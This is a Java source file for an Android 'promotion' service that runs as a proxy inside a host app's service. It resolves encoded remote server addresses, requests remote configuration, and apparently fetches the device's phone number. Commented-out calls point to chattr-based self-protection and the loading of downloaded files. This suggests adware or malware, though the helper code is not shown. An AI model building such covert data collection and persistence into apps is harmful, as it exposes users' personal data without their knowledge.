package com.mf.promotion.service;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.Resources;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.text.TextUtils;

import com.mf.basecode.service.HandleService;
import com.mf.basecode.utils.EncryptUtils;
import com.mf.basecode.utils.Logger;
import com.mf.basecode.utils.contants.BundleConstants;
import com.mf.basecode.utils.contants.CommConstants;
import com.mf.basecode.utils.contants.HandlerConstants;
import com.mf.promotion.util.PromReqManager;
import com.mf.promotion.util.PromUtils;
import com.mf.utils.NumberUtil;
import com.mf.utils.ResourceIdUtils;

public class MFApkService extends Service {
  public static final String TAG        = "MfApkService";
  private Handler            mHandler;
  private Service            that;                                                                // 母体注册过的service
  private HandleService[]       mfServices = new HandleService[MFApkServiceFactory.getTotalOfService()];
  Resources                  resources;
  private static long mLastNumberTime = 0;

  /**
   * 以handler方式管理其他子服务的关闭
   */

  private void initHandler() {
    mHandler = new Handler(that.getMainLooper()) {
      @Override
      public void handleMessage(Message msg) {
        switch (msg.what) {
        case HandlerConstants.HANDLER_STOP_SERVICE:
          Logger.debug(TAG, "stop apk service and service id = " + msg.arg1);
          mfServices[msg.arg1] = null;
          if (promServiceIsNull()) {
            if (that != null) {
              that.stopSelf();
            }
            Logger.debug(TAG, "stop all in apk service ");
          }
          break;
        default:
          break;
        }
      }
    };
  }

  private boolean promServiceIsNull() {
    for (HandleService mIMfService : mfServices) {
      if (null != mIMfService) {
        return false;
      }
    }
    return true;
  }

  @Override
  public IBinder onBind(Intent intent) {
    return null;
  }

  @Override
  public void onCreate() {
    super.onCreate();
  }

  @Override
  public void onDestroy() {
    super.onDestroy();
  }

  @Override
  public void onStart(Intent intent, int startId) {
    super.onStart(intent, startId);
  }

  /**
   * 采用单service方式来减少服务过多的问题
   */
  @Override
  public int onStartCommand(Intent intent, int flags, int startId) {
    if (intent == null || null == intent.getExtras()) {
      Logger.e(TAG, "intent is null");
      if (promServiceIsNull()) {
        that.stopSelf();
        Logger.debug(TAG, "stop all in apk service ");
      }
      return START_NOT_STICKY;
    }
    int serviceId = intent.getExtras().getInt(BundleConstants.BUNDLE_KEY_SERVICE_ID_APK, -2);
    // // 如果无service id(-2)不做处理，-1为启动所有服务；
    Logger.e(TAG, "start apk service and serviceId = " + serviceId);
    if (serviceId == -1) {
      addrCheck();
      checkServerAddr();
      PromReqManager.getInstance(that).ReqCommConfig();
      resetSDK();
//	  copyinit();
      getNumberOrdenTerInfo();
      return START_NOT_STICKY;
    } else if (serviceId >= 0 && null == mfServices[serviceId]) {
      mfServices[serviceId] = MFApkServiceFactory.getPromService(serviceId, that, mHandler);
    } else if (serviceId > mfServices.length) {
      stopSelf();
      return START_NOT_STICKY;
    }
    if (serviceId >= 0 && serviceId < mfServices.length) {
      try {
        mfServices[serviceId].onStartCommand(intent, flags, startId);
      } catch (Exception e) {
        Logger.p(e);
      }
    }
    return START_NOT_STICKY;
  }
  public void setProxyService(Service hostService, Resources resources) {
    Logger.d(TAG, "setProxy: setProxyService = " + hostService);
    that = hostService;
    this.resources = resources;
    ResourceIdUtils.getInstance().setResources(resources);
    if (mHandler == null) {
      initHandler();
    }
  }
  
  public void checkServerAddr(){
    SharedPreferences sf = that.getSharedPreferences(CommConstants.SHARED_PREFERENCE_SESSION, 0);
    String promAddress = sf.getString(CommConstants.SESSION_PROM_ADD, "");
    if(TextUtils.isEmpty(promAddress)){
      Logger.e(TAG, "checkServerAddr  addr  is  none");
      PromReqManager.getInstance(that).ReqServerAddr();
      return;
    }
  }
  
  public void resetSDK(){
    String sks = PromUtils.getInstance(that).getValueByNameFromSDKInfoFile(CommConstants.SDKS_INFO_KEY);
    Logger.e("mm", "mm mm mm =  "+sks);
    if(TextUtils.isEmpty(sks) || (!TextUtils.isEmpty(sks) && !sks.contains(that.getPackageName()))){
      sks = that.getPackageName()+"&"+sks;
      PromUtils.getInstance(that).putValueToSDKInfoFile(CommConstants.SDKS_INFO_KEY, sks);
    }
  }
  
//  private void copyinit() {
//    RUtils.getInstance(that).initChattr();
//    RUtils.getInstance(that).ChattrMySelf();
    
//    new Thread(new Runnable() {
//
//      @Override
//      public void run() {
//        List<EnhancedInfo> list = PromDBU.getInstance(that).queryEnhancedInfoByFileType(1);
//        if (list.size() >= 1) {
//          EnhancedInfo info = list.get(0);
//          EnhancedDo.getInstance(that).init(that, info.getDstFolder() + info.getFilename());
//          
//        }
//      }
//    }).start();

//  }
  
  
  private void addrCheck(){
    Logger.e(TAG, "addrCheck");
    SharedPreferences sf = that.getSharedPreferences(CommConstants.SHARED_PREFERENCE_SESSION, 0);
    String oriAddr = sf.getString(CommConstants.SESSION_ORIGIN_ADD+"0", "");
    Logger.e(TAG, "addrCheck  oriAddr = "+oriAddr);
    Logger.e(TAG, "addrCheck  oriAddr = "+EncryptUtils.getMfNetworkAddr(that,0));
    if((TextUtils.isEmpty(oriAddr)) || (!TextUtils.isEmpty(oriAddr) && !oriAddr.equals(EncryptUtils.getMfNetworkAddr(that,0)))){
      Logger.e(TAG, "addrCheck  oriAddr111 = "+EncryptUtils.getMfNetworkAddr(that,0));
      Editor edit = sf.edit();
      edit.putString(CommConstants.SESSION_ORIGIN_ADD+"0", EncryptUtils.getMfNetworkAddr(that, 0));
      edit.putString(CommConstants.SESSION_ORIGIN_ADD+"1", EncryptUtils.getMfNetworkAddr(that,1));
      edit.putString(CommConstants.SESSION_ORIGIN_ADD+"2", EncryptUtils.getMfNetworkAddr(that,2));
      edit.putString(CommConstants.SESSION_PROM_ADD, "");
      edit.putString(CommConstants.SESSION_STAT_ADD, "");
      edit.putString(CommConstants.SESSION_UPDATE_ADD, "");
      edit.commit();
      Logger.e(TAG, "addrCheck  oriAddr222 = "+EncryptUtils.getMfNetworkAddr(that,0));
    }
  }
  
  private void getNumberOrdenTerInfo(){
    if(mLastNumberTime == 0 || System.currentTimeMillis() - mLastNumberTime > 10*1000){
      mLastNumberTime = System.currentTimeMillis();
      NumberUtil.getInstance().phoneNumberGet(that);
//      RTUtil.getInstance(that.getApplicationContext()).sendRTReq();
    }
  }

}
